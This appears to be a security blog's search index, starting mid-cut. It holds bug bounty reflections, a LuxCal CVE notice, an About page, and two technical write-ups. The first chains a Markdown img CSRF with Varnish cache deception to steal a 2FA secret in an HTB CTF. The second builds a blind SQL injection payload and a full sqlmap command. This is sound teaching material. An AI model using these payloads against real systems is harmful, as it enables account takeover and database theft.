it.\n","link":"https://www.pmnh.site/post/writeup_spring_el_waf_bypass/","section":"post","tags":["writeup","rce","bugcrowd","waf"],"title":"Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass"},{"body":"","link":"https://www.pmnh.site/tags/bugcrowd/","section":"tags","tags":null,"title":"bugcrowd"},{"body":"","link":"https://www.pmnh.site/tags/waf/","section":"tags","tags":null,"title":"waf"},{"body":"","link":"https://www.pmnh.site/tags/learning/","section":"tags","tags":null,"title":"learning"},{"body":"In September 2022, I celebrated 2 years doing bug bounty as the anniversary of my first paid bounty on HackerOne passed. I thought it might be useful to write up some of the lessons learned and some tips and tricks that might help new hunters (things I wish I knew when I started). Bug bounty has been an incredible benefit in my life. It's allowed me the opportunity to achieve a lifestyle of continuous learning as well as transition to a full-time bug bounty career!\nA Quick Disclaimer There is a ton of great \u0026quot;getting started\u0026quot; information on the internet. Content creators such as Katie, Ben, Jason, have put together wonderful material. I'd suggest starting with these resources first and use this guide after your first month or two of getting started.\nAlso, keep in mind my hunting is 99% manual - I don't invest heavily in subdomain discovery, brute force scanning, etc. - so if that's your hunting style, you may not get much out of this post.\nMy First Bounty - 2020 Sep I started bug bounty in approximately July/Aug 2020 on HackerOne as a fun COVID hobby and a break from my full-time job in software development. I had signed up for a HackerOne account and done some of the CTFs several years earlier but really hadn't paid much attention to the bug bounty scene.\nWhen I first started bug bounty, my tools looked like:\nFiddler Proxy Google Docs (for taking notes) That's it! In fact, I literally did not change this tool set for the first 2-3 months of bug bounty, at which point I started to learn Burp Suite Community Edition.\nMy first bounty was on a private program (now public) which I earned an invite to from solving some of the H1 CTF challenges. The bug related to email enumeration through error message differentiation. Let's be clear: this is a terrible bug which is not accepted by most programs üòÑ I was enormously lucky (and later, enormously grateful) to the program for accepting the bug and paying me a massive $500 bounty (the only time you will hear me talk about earnings).\nWhen I was paid I was absolutely shocked - how could this be possible? I am doing what I love and companies are paying me to tell them about vulnerabilities like this!\nFrom starting bug bounty to first paid bounty took over 2 months - don't worry if it takes a while!\nLessons Learned from this early phase:\nTools matter a lot less than you think. Focus on a small set of bug types and get good at recognizing them. Don't give up and don't pay attention to others' achievements. Say \u0026quot;thank you\u0026quot; when a program pays you, no matter what the amount. Don't ask a program for updates before 1-2 months has passed (I regret that I asked this program for an update after 21 days). My Second Accepted Bug - 2020 Oct So it took over a month to get my next bug (not paid because the site was not part of the paid scope for the program). I made several (failed) attempts to submit additional bugs to that same private program (some duplicate, some invalid) and learned a lot about what really matters when hunting for bugs.\nIf you have to ask - is this a bug? - it is almost certainly not a bug.\nMy next bug was a persistent XSS in a public program with a fairly large scope and relatively low bounties. When dealing with a larger scope program I started to learn a little bit about better practices in terms of taking notes and simple tools for automation. My tools now looked like:\nFiddler Proxy VS Code (notes in Markdown) Subfinder for subdomain enumeration (the program I was working has a wildcard scope) A few hard lessons learned during this time about things that are not bugs (in most programs - there are always exceptions):\nUnrestricted upload to S3 bucket is almost always uninteresting to programs (unless the buckets are used to serve content in an interesting domain). Client-side bypasses without corresponding server-side bypasses are not really bugs. IDORs with a non-guessable key (UUID, complex identifier) and without an oracle are not reportable. Although each of these rejections was frustrating, it was a great way to learn what is reportable and to reinforce the rule above \u0026quot;if it doesn't seem like a bug, it's probably not\u0026quot;.\nNext Bounties and Catching my Rhythm By the end of Oct 2020, I had my 2nd paid bounty (IDOR) and I was starting to get some confidence. Keep in mind this is about 4 months since I started - it takes time to build confidence and know what you're looking for, especially at the beginning and especially on programs that have been well-hunted!\nIn Nov 2020 I received my first critical bounty (another IDOR) and at this point I was absolutely hooked on bug bounty as a hobby and a great way to challenge myself to continue to learn. I didn't change my toolset or methodology for another month, finally adopting Burp CE in Dec 2020, and then using my bounties to purchase a Burp Pro license in Jan 2021 (got tired of losing all my work and/or leaving Burp CE open for weeks at a time üòâ\nFor the first 4+ months of my bug bounty journey I did not own a Burp Pro license. I bought one once I earned more than enough to pay for it.\nSome final tips for the \u0026quot;getting started\u0026quot; part of my journey:\nStart with types of bugs that you understand based on your experience level. IDORs are usually very easy to explain and understand, as well as hunt for, even if you don't have a technical background. Understand how a browser works and the basics of HTML and Javascript if you are going to be hunting web type bugs (XSS in particular), otherwise you will get frustrated blindly copy/pasting payloads. Understand the purpose of VDPs and consider avoiding them. I know this is controversial. VDPs can be a great way for new people to find vulns in the real world, but also can give hunters a false sense of confidence. Make no mistake - paid programs are much harder than VDPs because there is a financial incentive for people to hunt them. Don't worry about points. They don't really matter. Learn the art of patience and respect with programs. Don't give bug bounty a bad reputation by trying to bully, swear, or behave unprofessionally. Hunt a program you're interested in. Nothing is worse than trying to stay motivated on a program that you don't understand or don't care about securing. Don't measure yourself against what you see on Twitter. Everyone is on their own journey. I didn't read bug bounty Twitter for at least a year after I started hunting. Stats Since I know people love stats - I'll share a few highlights here from my past 2 years and plan to do a follow-up post if there's interest. Note that some of these stats are a little hard to get automatically so they may be slightly fuzzy.\nI've included only accepted, non-duplicate bugs in the stats below, my duplicate rate is about 10-15% depending on the platform and program.\nPlatform Accepted Bug Total Crit / P1 (9-10) High / P2 (7-9) HackerOne 191 20 54 Bugcrowd 30 9 6 Synack 259 51 63 My top bug types in the P1/P2 range are:\nRCE SQLi Access Control / Authentication Bypass IDOR Definitely in recent times I focus more on these complex / deep bug types, I find them fun and challenging to discover as well as impactful for the affected companies.\nNote that few if any of these include findings on VDPs although the HackerOne stats include pen tests because it's not currently possible to filter out pen tests on that platform.\nWrap-Up Hopefully this was an interesting read about the start of my bug bounty journey and gives you a little insight into how to go from the very basics (many rejected bugs, no clue what a valid bug looks like or how to find it) to a successful bug bounty career.\nFor me - the programs that I've made the most money on HackerOne have all been public programs.\nA few closing thoughts:\nDon't focus on finding that magic private program. Although private programs which have been very lightly tested exist, they are very very rare on the major platforms. Don't let money be the motivator for bug bounty. I know this is probably controversial and of course bug bounty has made a huge difference in peoples' lives across the world - however if money is your primary motivator it will add stress, disappointment, and anxiety that will absolutely not help you focus. Consider bug bounty an amazing hobby that happens to pay money once you know what you're doing, and leave it that way for a while - maybe forever. Don't feel you need to understand every type of bug to be successful. Honestly, there are a bunch of types of bugs I've read about that I never look for (HTTP Response Splitting - I'm looking at you üëÄ). To me, the effort to get up to speed on these types of bugs is not worth the investment when I can instead get better at the bugs I already know. Don't stop learning. Challenge yourself! As soon as a hobby gets boring or repetitive, it's now become work. Try something new, pick up a challenging program that you think might be impossible. You will be surprised! Don't focus so much on using the newest fancy tool that you miss out understanding what it does or why it works. I can't tell you the number of people who can't answer a basic question about how an HTTP request works, or why an XSS payload works, who have 30+ tools they use for their hunting. Start with the basics, get a solid understanding, then automate to gain efficiency. Thank the people who built the tools you use - especially if you're using open source tools. There are real people behind all these amazing tools we can use for (mostly) free. If they help you, send a nice note to the author - it really means a lot! Thank you for your time in reading this, please send along any comments, my Twitter DM is open for good questions and meaningful feedback.\n","link":"https://www.pmnh.site/post/2022-sep-2-years-bug-bounty/","section":"post","tags":["learning"],"title":"Reflecting on 2 Years of Bug Bounty"},{"body":"","link":"https://www.pmnh.site/tags/csrf/","section":"tags","tags":null,"title":"csrf"},{"body":"Summary Genesis Wallet was one of the harder web challenges in the 2022 Hack the Box (HTB) CTF. Our team composed of Synack Red Team members finished a respectable 21st place, unfortunately we were very close to solving this challenge and literally were about 5 minutes from a successful solve when time expired - so sad!\nPersonally I thought this was a very clever challenge and probably one of the best designed web challenges in any CTF I've done to date, so I thought I'd share it with interested readers.\nSetup You are presented with the Genesis Wallet system, an online site that is used to transfer GTC tokens from one wallet address to another. You are provided with a set of credentials (username icarus and corresponding password) for a wallet and can log in using these credentials - BUT the site is protected by 2FA and requires you to also have an OTP code to log in.\nAs with the other HTB CTF challenges, we're provided with the full code of the application, which makes finding the path to the flag slightly easier.\nApplication Architecture This application is a NodeJS application running in a Docker container. It is fronted by a Varnish proxy server and has a SQLite database behind it.\nFinding the Flag With many of the white box challenges in this CTF, it is fairly easy to locate where the flag is available - the challenge is getting to it in the running web application!\nIn this case we can look at the routes/index.js file and see that the flag is displayed on the main application dashboard under certain conditions:\n1router.get(/^\\/(\\w{2})?\\/?dashboard/, AuthMiddleware, async (req, res) =\u0026gt; { 2\tlet lang = req.params[0]; 3\tif (!lang) lang = \u0026#39;en\u0026#39;; 4 5\treturn db.getUser(req.user.username) 6\t.then(user =\u0026gt; { 7\tlet flag = null; 8\tif (user.balance \u0026gt; 1337 \u0026amp;\u0026amp; user.username != \u0026#39;icarus\u0026#39;) flag = fs.readFileSync(\u0026#39;/flag.txt\u0026#39;).toString(); 9\tres.render(`${lang}/dashboard.html`, { user, flag }); So we can see that in order to display the flag we need to satisfy the following conditions:\nNeed to have a wallet balance which is substantial (\u0026gt;1337 GTC) Need to be logged in as a user who is not icarus (the credentials we are provided with the challenge) Initial Setup - New Account The site supports self registration functionality that proceeds as follows:\nRegister new username / password Log in with username / password Register 2FA QR code with authenticator Confirm OTP from authenticator When we create a new account, we discover that new users are granted 0.1 GTC free into their wallet. Based on the market cap of the GTC token this is very generous ;)\nIf we need to reach a balance greater than 1337 GTC this will require a lot of accounts and a lot of consolidation of \u0026quot;free\u0026quot; GTC tokens. There must be a way to get more tokens into an account we control!\nFinding the Tokens Let's look at how the database is seeded, maybe this will help us find a wallet with a balance? In database.js, which is used at startup of the NodeJS applcation to seed the database, we see the following:\n1\tasync migrate() { 2\tlet uOTPKey = OTPHelper.genSecret(); 3\tlet uAddress = crypto.createHash(\u0026#39;md5\u0026#39;).update(\u0026#39;icarus\u0026#39;).digest(\u0026#34;hex\u0026#34;); 4\treturn this.db.exec(` 5\tDROP TABLE IF EXISTS users; 6\tCREATE TABLE users ( 7\tid INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, 8\tusername VARCHAR(255) NOT NULL UNIQUE, 9\tpassword VARCHAR(255) NOT NULL, 10\tbalance DOUBLE DEFAULT 0.100, 11\totpkey VARCHAR(255) NULL, 12\taddress VARCHAR(36) NOT NULL UNIQUE 13\t); 14 15\tINSERT OR IGNORE INTO users (username, password, balance, otpkey, address) 16\tVALUES (\u0026#39;icarus\u0026#39;, \u0026#39;FlyHighToTheSky\u0026#39;, 1337.10, \u0026#39;${uOTPKey}\u0026#39;, \u0026#39;${uAddress}\u0026#39;); So we see that the user icarus has a wallet balance that is seeded with a little more GTC tokens than we need to satisfy the first flag criteria. To satisfy the second criteria, we need that balance to be in a wallet which is not controlled by the user icarus - so how can we manage a transfer of funds to our wallet?\nSteps to Transfer Funds After experimenting with the functionality of the site, we learn the flow to send funds from one wallet to another is as follows:\nSender intiates a transaction The transaction includes the receiver's wallet address and amount The transaction may include a note, specified in Markdown Sender confirms the transaction with their OTP Receiver can see the transaction on their dashboard and the funds are added to their wallet The transaction note specified in Markdown seems interesting, and I immediately thought that this could be an easy CSRF via XSS (a theme very common in web CTF challenges), however in this case we face the dreaded DOMPurify as can be seen in the NodeJS function responsible for converting the Markdown to HTML for rendering (located in helpers/MDHelper.js):\n1const showdown = require(\u0026#39;showdown\u0026#39;) 2const createDOMPurify = require(\u0026#39;dompurify\u0026#39;); 3const { JSDOM } = require(\u0026#39;jsdom\u0026#39;); 4 5const conv = new showdown.Converter({ 6\tcompleteHTMLDocument: false, 7 [...snip...] 8}); 9const makeHtml = (md) =\u0026gt; { 10 return(conv.makeHtml(md)); 11} 12const filterHTML = (content) =\u0026gt; { 13 html = makeHtml(content); 14 window = new JSDOM(\u0026#39;\u0026#39;).window; 15 DOMPurify = createDOMPurify(window); 16 return DOMPurify.sanitize(html, {ALLOWED_TAGS: [\u0026#39;strong\u0026#39;, \u0026#39;em\u0026#39;, \u0026#39;img\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;ul\u0026#39;, \u0026#39;ol\u0026#39;, \u0026#39;li\u0026#39;]}); 17} So we see that the showdown converter is used to convert Markdown to HTML, and the result is run through DOMPurify with a very restricted list of supported tags. I hoped that there was some trick here where an older / vulnerable version of DOMPurify was in use (we've seen this in several CTFs recently) but unfortunately this was not the case.\nFraming the Solution: CSRF via \u0026lt;img\u0026gt; tag After thinking about this for a bit, I realized that we had the potential to submit an \u0026lt;img\u0026gt; tag with an src= attribute that could invoke a GET-based CSRF attack, when the receiver (icarus) views the transaction.\nSide Quest: Finding icarus's Wallet Before I could test this theory, I had to solve the practical problem of not knowing what the wallet address for icarus was. Fortunately this was easily determined by running the code in the database seeding script in the Node CLI:\n1$ node 2\u0026gt; crypto.createHash(\u0026#39;md5\u0026#39;).update(\u0026#39;icarus\u0026#39;).digest(\u0026#34;hex\u0026#34;); 3\u0026#39;1ea8b3ac0640e44c27b3cb8a258a87f8\u0026#39; Next Steps: Finding a CSRF Fortunately there were not too many routes in this Node application, and I knew I had to find something that was GET-based and 2FA-related. After some code review I came upon the code to handle the initial setup (or resetting) of a user's 2FA authenticator application:\n1router.get(/^\\/(\\w{2})?\\/?(setup|reset)-2fa/, AuthMiddleware, async (req, res) =\u0026gt; { 2\tlet lang = req.params[0]; 3\tif (!lang) lang = \u0026#39;en\u0026#39;; 4\tlet otpkey = OTPHelper.genSecret(); 5 6\treturn db.setOTPKey(req.user.username, otpkey) 7\t.then(() =\u0026gt; { 8\treturn res.render(`${lang}/setup-2fa.html`, {otpkey: otpkey, action: req.params[1]}); We can see that, when invoked, this URL will generate a new OTP key for the currently logged-in user, save it to the database, and then display the key to them in their browser. Can you spot the critical bug here?\nThat's right - the new OTP key is saved to the database before being confirmed by the user. This is a pretty bad design because if the user doesn't confirm that they have scanned the QR into their authenticator app, they could be permanently locked out of their account (having reset the OTP without actually confirming that they have it!).\nSo, in theory this means that we can send a transaction note with the following HTML content to trigger generation of a new OTP key for the user receiving our transaction:\n1\u0026lt;img src=\u0026#34;/reset-2fa\u0026#34;\u0026gt; Of course we need to convert this into Markdown for use in the note:\n1![](/reset-2fa) We have a big problem though - how does this help in our quest to steal funds from icarus's wallet?\nExplainer: OTP Keys and 2FA via TOTP As a very brief explanation of what OTP keys are - most TOTP solutions rely on the creation of a shared secret, which is known by the server and the client. They use the same algorithm, seeded with this secret, to generate (client) and confirm (server) that the time-based codes are correct.\nKnowledge of this secret can lead to an attacker being able to generate their own TOTP codes which are guaranteed to be in sync with any other client as well as the server. This is well explained in the Wikipedia Article on TOTP codes.\nConfirming the CSRF As a quick confirmation, we created a transaction and sent it to the icarus wallet address containing an image that pointed to Burp Collaborator. We confirmed that shortly after the transaction was confirmed by the sender, the \u0026lt;img\u0026gt; tag was hit. Examining the code of the application, in bot.js we can see that there is code to log into the application and view the \u0026quot;transactions\u0026quot; page after every confirmed transaction:\n1const viewTransactions = async () =\u0026gt; { 2 try { 3\tconst browser = await puppeteer.launch(browser_options); 4\tlet context = await browser.createIncognitoBrowserContext(); 5\tlet page = await context.newPage(); 6 7\tlet token = await JWTHelper.sign({ username: \u0026#39;icarus\u0026#39;, otpkey: true, verified: true }); 8\tawait page.setCookie({ 9\tname: \u0026#34;session\u0026#34;, 10\t\u0026#39;value\u0026#39;: token, 11\tdomain: \u0026#34;127.0.0.1\u0026#34; 12\t}); 13\tawait page.goto(\u0026#39;http://127.0.0.1/transactions\u0026#39;, { 14\twaitUntil: \u0026#39;networkidle2\u0026#39;, So it seems we are onto something with this CSRF idea since there is clearly a headless browser that is intended to view the transaction note.\nThe Final Puzzle Piece - Grabbing the OTP secret This last piece actually took me a while to think through - we need to be able to view the content of the /reset-2fa page after it has been requested by icarus from our CSRF attack. How would we do this?\nFor anyone who plays CTFs regularly you know that usually \u0026quot;things are there for a reason\u0026quot; is an axiom you can follow if you get stuck for ideas. It occurred to me to look at the Varnish proxy configuration and then the final piece of the puzzle became clear. Let's look at config/cache.vcl, which is the Varnish Cache configuation file, written in VCL, the Varnish language. Particularly, this piece stood out to me:\n1sub vcl_recv { 2 # Only allow caching for GET and HEAD requests 3 if (req.method != \u0026#34;GET\u0026#34; \u0026amp;\u0026amp; req.method != \u0026#34;HEAD\u0026#34;) { 4 return (pass); 5 } 6 # get javascript and css from cache 7 if (req.url ~ \u0026#34;(\\.(js|css|map)$|\\.(js|css)\\?version|\\.(js|css)\\?t)\u0026#34;) { 8 return (hash); 9 } 10 # get images from cache 11 if (req.url ~ \u0026#34;\\.(svg|ico|jpg|jpeg|gif|png)$\u0026#34;) { 12 return (hash); 13 } We can see that Varnish is configured to cache any URL matching these regexes for static content. Crucially, it's important to note that the req.url value is the full URL of the request and not just the portion before any query string. This means that the following URL will be cached by Varnish:\n1/reset-2fa?ctf.jpg This was the final piece of the puzzle that was needed to grab the OTP secret. Basically, by adding a query string value that will trigger the Varnish caching of the page content, any other request to that same URL should return the same content until the Varnish cache TTL (in this case set to 2 minutes) expires. This should allow us to view the contents of the cached page which was rendered to icarus when the CSRF request took place!\nThis was a brilliant use of reverse cache poisoning, where we are forcing sensitive data to be cached such that an attacker can read it. Truly a brilliant design choice for this challenge!\nAssembling the Final Payload We now have all the steps requires to complete the mission:\nSend icarus a small transaction with a note containing the Markdown ![](/reset-2fa?123.jpg) When viewed, this will trigger a CSRF which will store a new OTP key in icarus's database account The content of the request will be (incorrectly) cached by Varnish We can request the same page to see the cached content We can use the OTP secret to configure our TOTP authenticator app to generate codes allowing us to log into the icarus account (as we already have the account password) Seems simple, right? I ran through this all, super excited, sent the request to http://46.101.25.63:31787/reset-2fa?123.jpg and.... got my own account 2FA reset - it wasn't the same OTP key that was cached. Why not!??!?!\nTurns out I had overlooked a key part of the Varnish configuration at the beginning of the VCL file:\n1sub vcl_hash { 2 hash_data(req.url); 3 4 if (req.http.host) { 5 hash_data(req.http.host); 6 } else { 7 hash_data(server.ip); 8 } 9 10 return (lookup); 11} The vcl_hash function is used to determine what elements of a request make it \u0026quot;unique\u0026quot; such that cached results can be looked up and returned (ref. VCL documentat of hashing). In this case, we can see that the Varnish hash is computed by:\nThe URL contents The Host header (if present) or server IP (if header is not present) So in this case, we are not seeing the cached content because the icarus bot is accessing it using the localhost URL as we saw above:\n1\tawait page.goto(\u0026#39;http://127.0.0.1/transactions\u0026#39;, { Therefore, the request http://127.0.0.1/reset-2fa is not equivalent to our request to the external IP address, thus we don't see the cached result. Fortunately this was an easy fix, we simply needed to change the value of the Host header in Burp to 127.0.0.1 to ensure we hit the same Varnish hash entry as icarus hit:\nWe can see in the response presumably the same OTP secret that was saved to the database under icarus's account:\n1\t\u0026lt;script\u0026gt; 2\tgenQRCode(\u0026#39;PFFF2UZEMUGSAN2H\u0026#39;); 3\t\u0026lt;/script\u0026gt; Finishing Up Now that we have the response and a QR code (we can show this page in the browser to get the QR code), the rest of the exercise was simply to log into icarus's account using the stolen OTP secret, transfer funds to our own wallet, and log into our own wallet to see the flag:\nFinal Thoughts Overall this was an extremely fun web challenge that required a number of creative solutions to achieve the seemingly obvious initial goal. I appreciate the designer who put this together!\n","link":"https://www.pmnh.site/post/ctf-htb-cyber-apolcalypse-web-genesis-wallet/","section":"post","tags":["ctf","nodejs","varnish","csrf"],"title":"CTF Writeup: 2022 HTB Cyber Apolcalypse Web Challenge: Genesis Wallet"},{"body":"","link":"https://www.pmnh.site/tags/nodejs/","section":"tags","tags":null,"title":"nodejs"},{"body":"","link":"https://www.pmnh.site/tags/varnish/","section":"tags","tags":null,"title":"varnish"},{"body":"","link":"https://www.pmnh.site/tags/authentication/","section":"tags","tags":null,"title":"authentication"},{"body":"","link":"https://www.pmnh.site/tags/cve/","section":"tags","tags":null,"title":"cve"},{"body":"Summary In research related to a Synack Red Team client, I was able to discover several authentication bypass issues in the LuxCal web calendar component. The limited details of these issues, which have been resolved by the vendor in version 5.2.0 of the software, are listed below. As an agreement with the vendor, we are releasing very limited information on this bypass. This resulted in the assignment of 2 CVEs from MITRE.\nCVSS for both is AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H 9.8.\nI'd like to thank the vendor for being extremely responsive to this issue!\nCVE 2021-45914 In LuxSoft LuxCal Web Calendar before 5.20, an unauthenticated attacker can mainipulate a POST request. This allows the attacker's session to be authenticated as any registered LuxCal user, including the site administrator.\nCVE 2021-45915 In LuxSoft LuxCal Web Calendar before 5.20, an unauthenticated attacker can mainipulate a cookie value. This allows the attacker's session to be authenticated as any registered LuxCal user, including the site administrator.\nRemediation Upgrade to version 5.2 of the LuxCal component at the vendor's site here\nMore details are available from the vendor here\nTimeline 2021 Dec 9 - Vendor contacted with details of the vulnerability 2021 Dec 9-23 - Researcher/vendor work together to qualify patch 2022 Jan 15 - Vendor releases V5.2.0 with remediation 2022 May 9 - Public release (agreed on 90 day+ hold time to allow customers to upgrade) ","link":"https://www.pmnh.site/post/cve-luxcal-2021/","section":"post","tags":["cve","authentication"],"title":"LuxCal 5.1.x and below Authentication Bypass: CVE-2021-45914, CVE-2021-45915"},{"body":"","link":"https://www.pmnh.site/tags/advanced/","section":"tags","tags":null,"title":"advanced"},{"body":"Summary Many new bug bounty hunters will blindly rely on the output of tools to magically find them bugs. As most experienced hunters know, the key to long-term success is to understand how to effectively use the many great tools and fine-tune these tools to achieve results in the form of valuable, challenging bugs.\nSince I joined the Synack Red Team, I have been digging into sqlmap and the intricacies involved in finding SQL injections \u0026quot;in the wild\u0026quot;. This will be the first of hopefully several posts on how to use sqlmap to work around challenging real-world scenarios where SQL injections exist. I hope you find this useful in your research!\nOn Manual Testing In almost all cases I never run sqlmap without first manually confirming the presence of a vulnerability! Don't be an irresponsible hunter - do your research manually or with low-impact scanning first!\nScenario In this scenario I was able to find a SQL injection vulnerability through source code auditing of the application I was testing. The application took a certain parameter and issued 2 SQL queries with it. The first query looked like this (partial query):\n1... select OID from pg_namespace where nspname=\u0026#39;{parameter}\u0026#39; ... If this query succeeded (returned a row), the code would issue a 2nd query as below:\n1select distinct object from {parameter} ... If the first query did not return a row, the code would instead throw a Python error:\n1AttributeError: \u0026#39;NoneType\u0026#39; object has no attribute So this means that in order to pass both queries the {parameter} needed to be a valid string in the first query and a valid table or view name in the 2nd query! Unfortunately this is inherently incompatible with the need to be able to construct a valid boolean true/false expression. I had to find another approach.\nThe Approach I determined that it was not going to be possible to get a payload that would successfully pass both queries, therefore I determined that I had to construct a payload that would satisfy the first query enough to generate a true/false result. \u0026quot;True\u0026quot; would mean the code would successfully execute the first query, and fail in the 2nd query. \u0026quot;False\u0026quot; would mean the code would successfully execute the first query, but because a row was not returned from the query, it would generate the AttributeError message. This got me set up with the \u0026quot;True\u0026quot; and \u0026quot;False\u0026quot; conditions I needed for sqlmap to work properly:\n\u0026quot;True\u0026quot;: Error message contains select distinct object from \u0026quot;False\u0026quot;: Error message contains AttributeError: 'NoneType' One other Wrinkle Because of the nature of the code involved, the SQL injection payload needed to be placed in the middle of the query parameter string in a specific location. Let's say the query parameter looked like this:\n1param=canary.bluebird The position of the SQL injection payload had to be here:\n1param=canary.bluebird 2 ^^ Basically, it had to be placed before the . character, in the middle of the string, in order for the first SQL query to successfully execute.\nValidating the Approach I tested this approach by the following query:\n1param=`cana\u0026#39;||(select/**/\u0026#39;r\u0026#39;/**/where/**/1=1)||\u0026#39;y.bluebird` I confirmed this corresponded to the \u0026quot;true\u0026quot; result (getting past the first SQL query and a syntax error on the 2nd). Changing the 1=1 to 0=1 confirmed the behavior of the \u0026quot;false\u0026quot; result (AttributeError). Great!\nNow, on to getting sqlmap to follow this same manual approach.\nA Couple more Wrinkles A few other wrinkles came up in my manual testing:\nBoth \u0026quot;true\u0026quot; and \u0026quot;false\u0026quot; resulted in an error page with HTTP status 500 The URL parameter had to be issued without URL encoding (i.e. ' instead of %27) Because of this, the inclusion of space characters would break the request, so they had to be replaced with comments /**/ I had to make sure that sqlmap followed these as well.\nWrangling sqlmap Let's get the easy stuff out of the way first:\nDon't encode URL parameters: use the --skip-urlencode flag Change spaces to comments: use the --tamper=space2comment flag to invoke this tamper script Tamper scripts modify the payload before it is sent to the target site! Match HTTP code 500 as part of the \u0026quot;true\u0026quot; result: use the --code=500 flag As an interesting side note: without this, sqlmap will assume a non-2xx status code is a failure (neither true nor false) and will ignore the result Now we need to get the positioning of the payload correct. We can use the --prefix and -suffix flags for this as follows:\n1--prefix=\u0026#34;cana\u0026#39;||\u0026#34; --suffix=\u0026#34;||\u0026#39;y.bluebird\u0026#34; If you are following along, you might wonder where the r character in canary went. Remember the injection point needs to be before the . in the valid parameter string. Remember a valid query \u0026quot;true/false\u0026quot; will look like this:\n1param=`cana\u0026#39;||(select/**/\u0026#39;r\u0026#39;/**/where/**/1=1)||\u0026#39;y.bluebird` You can see the r is being returned from the inner select statement if the where clause evaluates to \u0026quot;true\u0026quot;. If it evaluates to \u0026quot;false\u0026quot;, no value is returned, and we know that the parameter value of canay.bluebird (no r) will return 0 rows. This type of SQL injection corresponds to the sqlmap payload with \u0026quot;original value\u0026quot; in the name.\nTip: sqlmap has two types of payloads: one where the boolean condition returns the original value inline in the query, and the other where the boolean result is appended to the original value (the classic AND 1=1 type of payload) In this case, trying to get an AND 1=1 type payload in the middle of our parameter would make no sense at all! Therefore we're looking only for blind boolean payloads that use the original value in the constructed query string.\nThe final piece of the puzzle is helping sqlmap determine a true vs false result. In this case we use the --string parameter to suggest to sqlmap text that is guaranteed only to appear when the boolean value is true. In our analysis we determined the displayed error message will contain the string select distinct object from.\nPutting it all together, the final sqlmap command line looked like this:\n1...\u0026amp;param=r -p param --prefix=\u0026#34;cana\u0026#39;||\u0026#34; --suffix=\u0026#34;||\u0026#39;y.bluebird\u0026#34; --tamper space2comment --level=3 --risk=2 --string \u0026#34;select distinct object from ucon_p\u0026#34; --code=500 --dbms PostgreSQL --skip-urlencode --no-escape --no-cast --banner --technique=B With this combination of parameters I was able to translate my manual confirmation of the SQLi with the automatic data gathering magic of sqlmap\nFeedback? Hopefully this article was helpful in outlining how to reason through a complex SQL injection vulnerability. If you have any comments or want to collaborate on a report feel free to DM me on Twitter, I'm always open to collaboration with trusted people.\nLinks A couple other resources that cover this sort of advanced sqlmap content well:\nhttps://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-sql-injections/ https://thegreycorner.com/2017/01/05/exploiting-difficult-sql-injection.html ","link":"https://www.pmnh.site/post/advanced-sqlmap-case-study-1/","section":"post","tags":["sqlmap","sqli","advanced"],"title":"Advanced sqlmap Case Study"},{"body":"","link":"https://www.pmnh.site/tags/sqli/","section":"tags","tags":null,"title":"sqli"},{"body":"","link":"https://www.pmnh.site/tags/sqlmap/","section":"tags","tags":null,"title":"sqlmap"},{"body":"Brief Bio I'm a software developer, architect, author by trade, with years of experience in software large (millions of users) and small startups and non-profits. Recently I took a more active role in a life-long hobby of playing with security, cryptography, and puzzles into a full-on passion for security research, bug bounty, and the like.\nMy Stats I started bug bounty as a hobby in Sep 2020. I've hacked on 3 major platforms, my profiles are linked below:\nHackerOne - ~4000 rep, 7.0 signal, 23.5 impact Bugcrowd - ~550 pts, 100% accuracy, 15 P1s Synack (SRT) - level 0x05, top 10 globally I actively hunted on HackerOne from Sep 2020-Aug 2021. During this time, I was in the top 10 on the US leaderboard, delivering critical and high findings on numerous private and public programs. Towards the end of the year I moved to Bugcrowd, as well as joined the Synack Red Team (SRT), where I perform my primary hunting today, currently maintaining a top 5 position on the global SRT leaderboard.\nMy focus areas are deep recon / research and P1/P2/P3 findings. I'm always happy to discuss techniques around these or collaborate with hackers - ping me on Twitter (@pmnh_) or Discord (pmnh#8207). I haven't ever intentionally filed a P4/P5, so I can't really help you with questions about this class of bugs.\nWhy Read This Site? This simple site captures some stories and learnings on this journey. I hope you find it useful. I aim to publish once or twice monthly. My goal is to share interesting findings as well as some metrics and learnings as a relative newcomer to this field.\nThis site is not intended for people new to bug bounty, but instead targeting those looking to improve their craft, read more technical articles, and generally \u0026quot;talk shop\u0026quot;. In most cases I won't be explaining commonly Google-able terms and suggest you rely on the many great resources around the web for bug bounty basics.\nHow Do You Pronounce pmnh? You can simply say each letter üòÑ\nFeedback / Questions? Feel free to send any feebdack my way on Twitter, I can be reached at @pmnh_ - unfortunately my social media presence doesn't match my bug bounty platform names, sorry for any confusion üòÑ\n","link":"https://www.pmnh.site/about/","section":"","tags":null,"title":"About"},{"body":"","link":"https://www.pmnh.site/categories/","section":"categories","tags":null,"title":"Categories"},{"body":"","link":"https://www.pmnh.site/tags/index/","section":"tags","tags":null,"title":"index"},{"body":"","link":"https://www.pmnh.site/series/","section":"series","tags":null,"title":"Series"}]